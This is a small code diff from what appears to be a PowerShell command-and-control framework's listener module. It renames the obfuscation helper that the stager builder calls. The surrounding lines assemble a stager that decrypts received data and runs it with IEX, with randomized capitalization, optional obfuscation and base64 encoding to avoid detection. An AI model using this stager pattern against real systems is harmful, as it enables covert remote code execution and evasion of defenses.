@@ -244,7 +244,7 @@ class Listener(object):
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
+                    stager = data_util.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
 
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
